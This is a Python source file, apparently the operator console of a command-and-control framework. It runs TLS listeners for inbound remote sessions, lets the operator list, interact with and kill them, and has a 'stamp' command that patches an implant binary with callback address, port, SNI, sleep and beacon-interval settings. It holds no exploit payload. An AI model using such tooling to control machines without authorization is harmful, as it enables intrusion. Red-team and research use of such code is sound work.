import shlex
import asyncio
import logging
from enum import IntEnum
from uuid import uuid4
from dataclasses import dataclass
from prettytable import PrettyTable
from prompt_toolkit import PromptSession
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.patch_stdout import patch_stdout

from tls.tls import Tls, Mode
from shell.Session import Session
from shell.Parser import (
    parse_listen_args,
    parse_kill_listener_args,
    parse_interact_args,
    parse_kill_session_args,
)
from patcher.patch import Patcher


@dataclass
class ListenerEntry:
    """Wraps asyncio task as well as tls instance for each listener session"""

    task: asyncio.Task
    tls: Tls


class SessionManagerErrors(IntEnum):
    SUCCESS = (0,)
    INVALID_ARGS = (1,)
    UNABLE_TO_LISTEN = (2,)
    NO_ACTIVE_LISTENERS = (3,)
    NO_ACTIVE_SESSIONS = 4


class SessionManager:
    """Serves as single point of entry to the framework and performs management of all remote sessions"""

    def __init__(self):
        self.is_running: bool = True
        self.listeners: dict[uuid4, ListenerEntry] = {}
        self.sessions: dict[uuid4, Session] = {}
        self.log: logging.Logger = logging.getLogger("framework")
        self.commands: dict = {
            "exit": self.exit,
            "listen": self.listen,
            "kill_listener": self.kill_listener,
            "connect": self.connect,
            "kill_session": self.kill_session,
            "show_listeners": self.show_listeners,
            "show_sessions": self.show_sessions,
            "interact": self.interact,
            "stamp": self.stamp,
        }
        self.session: PromptSession = PromptSession(
            completer=WordCompleter(sorted(self.commands), sentence=True),
            history=InMemoryHistory(),
            complete_while_typing=False,
        )

    async def _on_connect(
        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
    ) -> None:
        session = Session(uuid4(), reader, writer)
        self.sessions[session.session_id] = session

        session.log.info(
            f"Session {session.session_id} established via peername: {session.addr[0]}:{session.addr[1]}"
        )

    async def manage(self) -> None:
        with patch_stdout():
            while self.is_running:
                try:
                    cmd = await self.session.prompt_async(">>> ")
                except (EOFError, KeyboardInterrupt):
                    await self.exit(None)
                    continue

                if cmd is None or 0 == len(cmd):
                    continue

                try:
                    split_cmd = shlex.split(cmd)
                except ValueError as format_error:
                    self.log.info(format_error)
                    continue

                if split_cmd[0] not in self.commands:
                    self.log.info(f"invalid command: {split_cmd[0]}")
                    continue

                await self.commands[split_cmd[0]](split_cmd[1:])

    async def listen(self, args: list) -> SessionManagerErrors:
        """Uses supplied values to craft a Tls `listener` that awaits inbound connections"""

        usage: str = "listen [-b <address>] [-p <port>] --certs <cert dir>"

        # validate args length is non zero and then pass to argparse
        if len(args) == 0:
            self.log.info(usage)
            return SessionManagerErrors.INVALID_ARGS

        parsed_args = parse_listen_args(args, usage)
        if parsed_args is None:
            return SessionManagerErrors.INVALID_ARGS

        # create tls listener, check whether an immediate error has occured during setup and if not, create background async task and store into listeners dict
        listener = Tls(
            parsed_args.bind, parsed_args.port, parsed_args.certs, Mode.SERVER
        )
        if not await listener.create_listener(self._on_connect):
            return SessionManagerErrors.UNABLE_TO_LISTEN

        task = asyncio.create_task(listener.start_listener())
        task_id = uuid4()

        self.listeners[task_id] = ListenerEntry(task=task, tls=listener)

        return SessionManagerErrors.SUCCESS

    async def show_listeners(self, _) -> SessionManagerErrors:
        if not self.listeners:
            self.log.info("No active listeners")
            return SessionManagerErrors.NO_ACTIVE_LISTENERS

        table = PrettyTable(["Index", "UUID", "Address"])
        for idx, (l_uid, entry) in enumerate(self.listeners.items()):
            for sock in entry.tls.server.sockets:
                addr = sock.getsockname()
                table.add_row([idx, l_uid, addr])
        print(table)

        return SessionManagerErrors.SUCCESS

    async def kill_listener(self, args: list) -> SessionManagerErrors:
        """Cancels the current running asyncio task for specified listener session and awaits server closure"""

        usage = "kill_listener --index <num>"

        if not self.listeners:
            self.log.info("No active listeners")
            return SessionManagerErrors.NO_ACTIVE_LISTENERS

        # parse the required args for cancelling listener sessions
        if len(args) == 0:
            self.log.info(usage)
            return SessionManagerErrors.INVALID_ARGS

        parsed_args = parse_kill_listener_args(args, usage)
        if parsed_args is None:
            return SessionManagerErrors.INVALID_ARGS

        # attempt to validate that the index exists within the stored dict and if so, pop the entry
        try:
            listener_uuid = list(self.listeners.keys())[parsed_args.index]
            entry = self.listeners.pop(listener_uuid)
        except IndexError:
            self.log.info(f"Invalid index selection {parsed_args.index}")
            return SessionManagerErrors.INVALID_ARGS

        # close down the server and await for any pending connections to complete before cancelling the asyncio task
        entry.tls.server.close()

        try:
            await asyncio.wait_for(entry.tls.server.wait_closed(), timeout=5)
        except asyncio.TimeoutError:
            pass

        entry.task.cancel()

        return SessionManagerErrors.SUCCESS

    async def interact(self, args: list) -> SessionManagerErrors:

        usage: str = "interact --index <num>"

        if not self.sessions:
            self.log.info("No active remote sessions")
            return SessionManagerErrors.NO_ACTIVE_SESSIONS

        if len(args) == 0:
            self.log.info(usage)
            return SessionManagerErrors.INVALID_ARGS

        # parse the required args for interacting with remote sessions
        parsed_args = parse_interact_args(args, usage)
        if parsed_args is None:
            return SessionManagerErrors.INVALID_ARGS

        # attempt to validate supplied index and obtain handle to session
        try:
            sess_uuid = list(self.sessions.keys())[parsed_args.index]
            session = self.sessions[sess_uuid]
        except IndexError:
            self.log.info(f"Invalid index selection {parsed_args.index}")
            return SessionManagerErrors.INVALID_ARGS

        # go interactive with specified session
        await session.run()

        return SessionManagerErrors.SUCCESS

    async def show_sessions(self, _):
        if not self.sessions:
            self.log.info("No active remote sessions")
            return SessionManagerErrors.NO_ACTIVE_SESSIONS

        table = PrettyTable(["Index", "Session Name", "Session UUID", "Address"])
        for idx, (s_uid, session) in enumerate(self.sessions.items()):
            table.add_row([idx, session.name, s_uid, session.addr])
        print(table)

        return SessionManagerErrors.SUCCESS

    async def kill_session(self, args: list) -> SessionManagerErrors:

        usage: str = "kill_session --index <num>"

        if not self.sessions:
            self.log.info("No active remote sessions")
            return SessionManagerErrors.NO_ACTIVE_SESSIONS

        if len(args) == 0:
            self.log.info(usage)
            return SessionManagerErrors.INVALID_ARGS

        parsed_args = parse_kill_session_args(args, usage)
        if parsed_args is None:
            return SessionManagerErrors.INVALID_ARGS

        try:
            sess_uid = list(self.sessions.keys())[parsed_args.index]
            session = self.sessions.pop(sess_uid)
        except IndexError:
            self.log.info(f"Invalid index selection {parsed_args.index}")
            return SessionManagerErrors.INVALID_ARGS

        if session.writer:
            session.writer.close()

            try:
                await asyncio.wait_for(session.writer.wait_closed(), timeout=5)
            except (asyncio.TimeoutError, ConnectionResetError):
                pass

        return SessionManagerErrors.SUCCESS

    async def stamp(self, args: list) -> SessionManagerErrors:
        """Stamps sinister thrawn binary with embedded TLS configuration"""

        usage: str = (
            "stamp -p <port> --certs <cert dir>"
            " [-c <callback addr> | -l <listen addr>]"
            " [--sleep <seconds before first action>]"
            " [-s <sni>] [-i <callback interval>] [--m <max callback attempts>]"
            " --infile <path> --outfile <path>"
        )

        if len(args) == 0:
            self.log.info(usage)
            return SessionManagerErrors.INVALID_ARGS

        if not await Patcher().patch_binary(args, usage):
            return SessionManagerErrors.INVALID_ARGS

        return SessionManagerErrors.SUCCESS

    async def exit(self, _):
        self.is_running = False

        for l_uuid, listener in self.listeners.items():
            listener.tls.server.close()

            try:
                await asyncio.wait_for(listener.tls.server.wait_closed(), timeout=5)
            except asyncio.TimeoutError:
                pass

            listener.task.cancel()

            self.log.debug(f"Closed listener: {l_uuid}")

        for _, session in self.sessions.items():
            if session.writer:
                session.writer.close()

                try:
                    await asyncio.wait_for(session.writer.wait_closed(), timeout=5)
                except (asyncio.TimeoutError, ConnectionResetError):
                    pass

            self.log.debug(f"Closed remote session: {session.session_id}")

    # todo: connect
    async def connect(self, args):
        pass
